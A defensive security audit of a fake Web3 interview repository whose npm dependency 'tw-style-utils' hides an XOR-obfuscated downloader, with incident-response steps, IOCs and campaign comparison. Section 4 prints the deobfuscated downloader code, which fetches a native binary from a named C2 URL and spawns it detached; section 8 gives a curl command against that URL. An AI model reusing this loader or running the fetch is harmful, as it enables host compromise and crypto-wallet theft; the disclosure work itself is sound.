# Security Audit — GitHub `star45674/smart-contract-engineer-role`

**Source:** https://github.com/star45674/smart-contract-engineer-role
**Default branch:** `main`
**Auditor role:** Senior OpSec / Blockchain
**Method:** Read-only static review via raw.githubusercontent.com, the GitHub HTML view, the npm registry, and the unpkg CDN (to inspect the malicious dependency's actual source). No clone, no install, no editor open. The native second-stage binary was **not** downloaded.
**Date:** 2026-05-27

---

## Verdict (TL;DR)

**Active malware delivered through a single trojanized npm dependency.**

The repository itself is a clean, professional, fully plausible "Web3 engineer home task" (a bounty-escrow assessment called *ChainQuest*). The entire attack is one poisoned dependency: **`tw-style-utils`**, pinned to `"latest"`, which is imported and executed by `tailwind.config.ts`. That package is a verbatim copy of the legitimate `@tailwindcss/typography` plugin with an **XOR-obfuscated Node.js downloader appended to `src/index.js`**. On import (during `npm run dev` / `npm run build`), it fetches an OS/arch-specific native executable from a C2 server and runs it detached in the background.

This is the **fourth** repo in the same fake-Web3-interview campaign family previously documented (`0xmintmvp/assignment`, `tech_lisa/challenge`, `veneliteus-dev/arbitrage-bot-contract`). The lure is identical in spirit; the delivery technique is new — a malicious npm package instead of a `.vscode` folder-open task or a git hook.

**Do not:** `npm install`, `npm install --prefix contracts`, `npm run dev`, `npm run build`, `npm run test`, or open the project in any tooling that resolves the Tailwind config.
**If you already ran install + dev/build:** treat the host as compromised and any wallet ever unlocked on it as drained — see § 8.

![3](/assets/RatherLabs/3.png)

---

## 1. Repository inventory

Root:

```
app/        assessment/   assets/    components/   contracts/   lib/
.env.example   .gitignore   LICENSE   README.md
next-env.d.ts  next.config.ts   package.json   postcss.config.mjs
tailwind.config.ts   tsconfig.json
```

Notable: **no `.vscode/` directory, no `.githooks/` directory.** (`.vscode/tasks.json` confirmed HTTP 404.) Unlike the previous three repos, there is no folder-open or git-hook trigger. The attack is purely supply-chain.

`contracts/` (nested Hardhat project, installed separately per the README):

```
contracts/    scripts/    test/
.npmrc        hardhat.config.ts   package-lock.json   package.json   tsconfig.json
```

---

## 2. The lure: fake "ChainQuest" home task

`README.md` and `assessment/instructions.md` describe a polished ~2–3 hour take-home:

- Implement `contracts/contracts/QuestEscrow.sol` (an ETH/ERC-20 bounty escrow with a 3% fee, `FEE_BPS = 300`), pass 9 assessment scenarios (A–I).
- Implement wallet write hooks in `lib/hooks/useQuestEscrow.ts` (`useCreateQuest`, `useQuestActions`) using wagmi `useWriteContract` + `useWaitForTransactionReceipt`.
- Run a local Hardhat chain (chain id 31337), deploy, run the Next.js UI at `http://localhost:3000`, connect MetaMask, complete a UI checklist.
- **Submit:** a GitHub URL to your completed repo, screenshots under `assets/`, and a `README-SUBMISSION.md` with your name, email, and contract address.

This is the standard fake-interview playbook: a realistic, time-pressured assessment that compels the candidate to run `npm install` and `npm run dev` on their own machine. GitHub owner `star45674` is a throwaway account.

The setup section instructs:

```bash
npm install
npm install --prefix contracts
QUEST_ASSESSMENT_SOLUTION=1 npm run test
# then: npm run contracts:node / contracts:deploy / dev
```

`npm install` pulls the malicious dependency; `npm run dev`/`build` detonates it.

---

## 3. The vector — `tw-style-utils`

### 3.1 How it is wired in

`tailwind.config.ts` (root):

```ts
import type { Config } from "tailwindcss";
import twUtils from "tw-style-utils";

const config: Config = {
  plugins: [twUtils],
};

export default config;
```

`package.json` (root) dependency:

```json
"tw-style-utils": "latest"
```

Importing the module evaluates its top-level code (where the payload lives). Tailwind loads `tailwind.config.ts` during `next dev` and `next build` (via `@tailwindcss/postcss`), so the payload runs at **dev/build time** — not at install time. This means `npm install --ignore-scripts` does **not** protect against it.

### 3.2 Registry metadata (red flags)

From `https://registry.npmjs.org/tw-style-utils`:

- Latest version **0.7.1**, published **2026-05-26** — one day before this audit. Brand-new.
- Maintainer **`superstar777` / `paolokarl328@gmail.com`** — throwaway Gmail, no organisation.
- **No `repository` field** — source cannot be reviewed on GitHub; only the published tarball exists.
- Production dependency `postcss-selector-parser@6.0.10` and a `tailwindcss` peer dep — included purely to look like a real Tailwind plugin.
- The **latest version has no `preinstall`/`postinstall`/`prepare`/`install` scripts** — deliberately, because the payload is in the runtime entry point instead (sneakier; survives `--ignore-scripts`).
- Pinned to `"latest"` in the repo — the operator can swap in a new payload at any time and every fresh install picks it up.

### 3.3 Package file layout (via unpkg)

`tw-style-utils@0.7.1` ships:

```
/LICENSE
/README.md
/package.json   (main: "src/index.js")
/src/index.js   ← legitimate @tailwindcss/typography code + appended malware
/src/styles.js  ← clean (copy of typography styles)
/src/utils.js   ← clean (copy of typography utils)
/src/index.d.ts
```

`src/styles.js` and `src/utils.js` were read in full and are byte-for-byte the legitimate `@tailwindcss/typography` helpers — no malice. The package is a **trojanized fork of `@tailwindcss/typography`**: the real plugin up top, the malware bolted on at the bottom of `index.js`.

---

## 4. The payload (deobfuscated)

### 4.1 Obfuscation scheme

At the end of `src/index.js`, after the legitimate `module.exports = plugin.withOptions(...)`, an IIFE is appended. Strings are stored as byte arrays and decoded by:

```js
function decode(arr){
  const out = new Uint8Array(arr.length);
  for (let i=0;i<arr.length;i++) out[i] = 0x2a ^ arr[i];   // single-byte XOR with 0x2a
  return new TextDecoder('utf-8').decode(out);
}
```

A second helper array (`['length','utf-8','decode','indexOf','slice','function','require','resolve','process','arch','test','location','origin','replace','fetch','Buffer','call','document']`) supplies property names via index lookup. Both are standard obfuscator.io-style indirection.

### 4.2 Decoded behaviour

1. **Environment probe** — `Boolean(global.process && global.process.versions && typeof global.process.versions.node === 'string')` → "are we in Node?".

2. **C2 URL construction** — decodes the base URL and, in Node, appends `?os=<darwin|linux|windows>&arch=<amd64|arm64>`:

   ```
   https://api.otter-stack.com/d/IobO0YELAu4CJ2oG4iC4W38OxsOtTk8a/agent?os=darwin&arch=arm64
   ```

   (`process.platform`: `darwin`→`darwin`, `linux`→`linux`, `win32`→`windows`; `process.arch`: `arm64`→`arm64`, else `amd64`.)

3. **Node branch (primary)** — dynamic `import()` of `node:fs/promises`, `node:path`, `node:child_process`, `node:os`, then:

   ```js
   fetch(url)
     .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.arrayBuffer(); })
     .then(buf => {
       const data = Buffer.from(buf);                 // downloaded native executable
       const name = <OS-specific disguise filename>;  // see table below
       const dest = path.join(os.tmpdir(), name);
       return fs.writeFile(dest, data, { mode: 0o700 }).then(() => {
         child_process.spawn(dest, [], {
           cwd: process.cwd(),
           env: process.env,
           shell: false,
           detached: true,
           stdio: 'ignore',
           windowsHide: <true on win32>
         }).unref();                                  // run detached, silent, survives parent exit
       });
     });
   ```

4. **Browser branch (fallback)** — if not Node, creates a hidden `<a href=url download=name rel="noopener">`, appends to `document.body`/`documentElement`, `.click()`s it (drive-by download), then `.remove()`s it.

### 4.3 Dropped-file disguises

The downloaded binary is written into the OS temp directory under a name chosen to blend in with system services:

| `process.platform` | Disguise filename | Mimics |
|---|---|---|
| `win32`  | `WpnUserSvc.exe` | Windows Push Notification User Service |
| `darwin` | `com.slack.autoLaunch.agent.plist` | a Slack LaunchAgent |
| `linux`  | `packagekit-update.service` | a PackageKit systemd unit |

The downloaded "agent" is the real second stage (infostealer / RAT). Based on this campaign family's documented payloads, expect browser-profile + wallet-extension theft, keychain/credential harvesting, and persistence (LaunchAgent / systemd user unit / Run-key). The exact behaviour must be confirmed by retrieving the binary in an isolated VM (see § 8 step 6) — the filename suffixes above also hint at the persistence artefacts it installs.

---

## 5. The rest of the repo — clean

Reviewed and found benign (scenery for the lure):

- `next.config.ts` — `{ reactStrictMode: true }`. Clean.
- `postcss.config.mjs` — standard `@tailwindcss/postcss` plugin. Clean.
- `contracts/package.json` — scripts `compile/test/node/deploy` only; **no install hooks**; standard Hardhat + OpenZeppelin deps. Clean.
- `contracts/hardhat.config.ts` — Solidity 0.8.30, hardhat + localhost networks (chain 31337). Standard imports only. Clean.
- `contracts/.npmrc` — single line `legacy-peer-deps=true`. Benign (does **not** redirect the registry or set tokens).
- Root `.npmrc` — does not exist (404).
- `lib/hooks/useQuestEscrow.ts` — wagmi/viem read hooks plus stubbed write hooks (TODOs for the candidate). No `window.ethereum` abuse, no fetch/axios, no eval, no key handling. Clean.
- `.env.example` — only local placeholders: `NEXT_PUBLIC_QUEST_ESCROW_ADDRESS=`, `NEXT_PUBLIC_MOCK_USDC_ADDRESS=`, `NEXT_PUBLIC_CHAIN_ID=31337`, `NEXT_PUBLIC_RPC_URL=http://127.0.0.1:8545`. No remote endpoints, no secrets solicited.

The professionalism and cleanliness of everything else is precisely what makes the single poisoned dependency effective: a candidate can audit the Solidity and the UI for hours and find nothing.

---

## 6. Trigger summary

| Action by victim | Result |
|---|---|
| View on GitHub only | Safe. |
| `git clone` only | Repo on disk; nothing runs. |
| `npm install` | Pulls `tw-style-utils@latest` (and `--prefix contracts` pulls the clean Hardhat deps). Current version has no install hook, so nothing executes **yet** — but the malicious module is now on disk and the `latest` pin means a future version could add an install hook. |
| `npm run dev` / `npm run build` | **Detonation.** Tailwind loads `tailwind.config.ts` → imports `tw-style-utils` → downloader runs → native agent fetched from `api.otter-stack.com` and executed detached. Host compromised. |
| `npm run test` | Runs the Hardhat contract tests in `contracts/` (separate, clean project). Does **not** itself load the root Tailwind config — but by this point the candidate will run `dev` anyway. |

---

## 7. Severity-ranked finding list

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| 1 | **Critical** | dependency `tw-style-utils` (`src/index.js`) | XOR-obfuscated Node downloader appended to a trojanized `@tailwindcss/typography`; fetches and spawns a native binary from C2. |
| 2 | **Critical** | `tailwind.config.ts` | Imports and invokes `tw-style-utils` as a plugin → executes the payload on every `dev`/`build`. |
| 3 | **High** | `package.json` | `"tw-style-utils": "latest"` — unpinned malicious dependency; payload is operator-swappable; brand-new package, throwaway maintainer, no repo. |
| 4 | **High** | `README.md` / `assessment/instructions.md` | Fake "ChainQuest" home task engineered to make the candidate run `npm install` + `npm run dev` on a personal machine. |
| 5 | **Info** | repo at large | Clean, professional Next.js/Hardhat scaffold serving as camouflage; no `.vscode`/`.githooks` triggers (sole vector is the dependency). |

---

## 8. Incident response

### If you only viewed it on GitHub or cloned without installing
Safe. Delete the clone. **Do not run `npm install`.**

### If you ran `npm install` but never ran `dev`/`build`
The malicious module is on disk but (in version 0.7.1) has not executed, because the current version has no install hook. To be safe:
1. `rm -rf node_modules package-lock.json` in both the root and `contracts/`.
2. Confirm nothing executed: check `os.tmpdir()` (`/tmp`, `%TEMP%`, `$TMPDIR`) for `WpnUserSvc.exe` / `com.slack.autoLaunch.agent.plist` / `packagekit-update.service`. If present, treat as compromised (below).
3. Delete the project.

### If you ran `npm run dev` / `npm run build` (or any Tailwind-loading tooling) — assume **full host compromise**
1. **Disconnect the host from the network.** Kill any process matching the dropped filenames; remove those files from the temp dir.
2. From a **separate, clean machine**, rotate everything: SSH keys, code-forge tokens/sessions (GitHub/GitLab/Bitbucket), npm tokens, AWS/GCP/Azure keys, password-manager vault (master password + all contents), Slack/Telegram/Discord sessions, email + 2FA/TOTP seeds, browser-saved passwords and exchange sessions.
3. **Crypto (highest priority):** every wallet ever unlocked on the host — MetaMask, Phantom, Rabby, Trust, Exodus, OKX, Coinbase Wallet, Argent, Keplr, etc. Assume seeds were exfiltrated. Sweep any remaining balances to fresh addresses generated on a brand-new hardware wallet whose seed never touched the machine. Move fast.
4. **Wipe and reimage.** Do not trust AV. Hunt persistence the dropped agent may have installed:
   - macOS: `~/Library/LaunchAgents/*.plist` (esp. anything mimicking `com.slack.*` / `com.apple.*`), `~/Library/Application Support/`.
   - Linux: `~/.config/systemd/user/*.service` (esp. names like `packagekit-update.service`), `crontab -l`, `~/.local/share/`.
   - Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, Scheduled Tasks, Startup folder, `%APPDATA%`.
5. **Network forensics:** search DNS/proxy/firewall logs for `api.otter-stack.com` / `otter-stack.com` from the host since you cloned. Pivot on source IPs to find affected colleagues.
6. **Optional binary retrieval (IR only):** from a network-isolated throwaway VM (no creds, no wallets), download the agent *to disk* (do not execute) with appropriate `os`/`arch` query params:
   ```
   curl -L -A 'Mozilla/5.0' -o agent_darwin_arm64 \
     'https://api.otter-stack.com/d/IobO0YELAu4CJ2oG4iC4W38OxsOtTk8a/agent?os=darwin&arch=arm64'
   ```
   Repeat for `os=linux&arch=amd64` and `os=windows&arch=amd64`. Analyse statically; submit to VirusTotal / MalwareBazaar / Socket. The operator may serve a decoy to sandbox-looking clients.
7. **Report:**
   - npm: use "Report malware" on the package page and email `security@npmjs.com` with the package name, version, and decoded C2. Request takedown of `tw-style-utils` and a maintainer-account review (`superstar777`).
   - GitHub abuse: https://github.com/contact/report-abuse → "Malware or exploits", referencing `star45674`.
   - `otter-stack.com`: report to its registrar/host abuse contact.
   - Submit IOCs to Socket.dev, Phylum, VirusTotal, MalwareBazaar (tags: `npm`, `tailwind-typosquat`, `crypto-stealer`, `contagious-interview`).
8. **Prevention going forward:** never use `"latest"` or floating ranges for dependencies; commit and review lockfiles; install with `npm ci`; consider Socket/Phylum CI gates that flag brand-new packages, packages without a repository, and packages whose entry point contains `child_process`/`spawn`/obfuscated blobs.

---

## 9. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| npm package | `tw-style-utils` (all versions — treat entire package as malicious) |
| npm version observed | `0.7.1`, published 2026-05-26 |
| npm maintainer | `superstar777` / `paolokarl328@gmail.com` |
| C2 URL | `https://api.otter-stack.com/d/IobO0YELAu4CJ2oG4iC4W38OxsOtTk8a/agent` |
| C2 query params | `?os=<darwin\|linux\|windows>&arch=<amd64\|arm64>` |
| C2 domain | `api.otter-stack.com` / `otter-stack.com` (block) |
| Dropped file (Windows) | `%TEMP%\WpnUserSvc.exe` |
| Dropped file (macOS) | `$TMPDIR/com.slack.autoLaunch.agent.plist` |
| Dropped file (Linux) | `/tmp/packagekit-update.service` |
| GitHub repo | `star45674/smart-contract-engineer-role` |
| GitHub owner | `star45674` |
| Technique | XOR-`0x2a` obfuscated IIFE appended to a copy of `@tailwindcss/typography`'s `index.js`; runtime downloader (no install hook); imported via `tailwind.config.ts`. |

YARA/Semgrep idea: flag any npm package whose entry module contains a long numeric byte array followed by `^ 0x2a` and a `TextDecoder('utf-8')`, combined with dynamic `import('node:child_process')` and `spawn(...).unref()`.

---

## 10. Tradecraft comparison (campaign family, four iterations)

| Repo | Lure | Trigger | Payload location | C2 | Persistence |
|------|------|---------|-----------------|----|-------------|
| `0xmintmvp/assignment` (Bitbucket) | Fake interview (MERN crypto) | VS Code `folderOpen` → `node .vscode/cancel` | In-repo 105 KB obfuscated Node blob | (in-repo) | per fetched payload |
| `tech_lisa/challenge` (Bitbucket) | Fake interview (Hardhat ERC-20) | `folderOpen` → poison `core.hooksPath` → `post-checkout` → `curl\|sh` | Remote (Vercel) | `gitconfig-nyx-v1.vercel.app` | local git config (`core.hooksPath`) |
| `veneliteus-dev/arbitrage-bot-contract` (GitHub) | Fake "free MEV bot" | `folderOpen` → `curl\|sh` (direct) | Remote (shortener) | `chvsvr.short.gy` | per fetched payload |
| **`star45674/smart-contract-engineer-role`** (GitHub) | Fake interview ("ChainQuest" escrow) | `npm run dev`/`build` → Tailwind config imports malicious dep | **npm package** (`tw-style-utils`) | `api.otter-stack.com` | per fetched native agent (temp-dir drop + spawn) |

Across the four, the trigger has migrated: in-repo blob → git-hook poisoning → direct `curl|sh` → **published npm dependency**. The npm-dependency variant is the stealthiest for a code reviewer (the repo is spotless; the malice is one `import` away in a registry package) and the loudest for a network monitor (an unexpected `fetch` to `api.otter-stack.com` followed by a `spawn` from temp). It also evades `--ignore-scripts` because it executes on import, not install.

---

## 11. Files inspected

Read in full: `README.md`, `assessment/instructions.md`, `package.json`, `next.config.ts`, `postcss.config.mjs`, `tailwind.config.ts`, `.env.example`, `lib/hooks/useQuestEscrow.ts`, `contracts/package.json`, `contracts/hardhat.config.ts`, `contracts/.npmrc`. Confirmed absent: root `.npmrc` (404), `.vscode/tasks.json` (404).

Dependency inspected via registry + unpkg: `tw-style-utils@0.7.1` — `package.json`, `src/index.js` (payload), `src/utils.js` (clean), `src/styles.js` (clean), file manifest.

Not retrieved (by design): the native second-stage agent at the C2 URL (must be fetched in an isolated VM per § 8 step 6).

Directory-listed but not exhaustively opened (Next.js UI scenery and Hardhat fixtures): `app/`, `components/`, `assets/`, `contracts/contracts/`, `contracts/scripts/`, `contracts/test/`.

---

## 12. Bottom line

This is **not** a coding assessment. It is a crypto-targeted **supply-chain malware delivery** wrapped in an immaculate fake interview task. The single malicious moving part is `tw-style-utils` — a one-day-old npm package masquerading as a Tailwind typography plugin, carrying an XOR-obfuscated downloader that pulls and runs a native agent from `api.otter-stack.com` the moment the project is built or dev-served. Everything else in the repo is real and clean, which is exactly the point.

**Recommendation:** report and destroy. Pin/lock all dependencies and never honour a "home task" that asks you to `npm install` an unfamiliar repo on a machine that holds wallets or production credentials. If a recruiter sent you this, treat them as the adversary and warn anyone else they contacted. Treat any host that ran `npm run dev`/`build` as compromised and follow § 8.

![1](/assets/RatherLabs/2.png)
![2](/assets/RatherLabs/2.png)
![4](/assets/RatherLabs/4.png)
![5](/assets/RatherLabs/5.png)
![6](/assets/RatherLabs/6.png)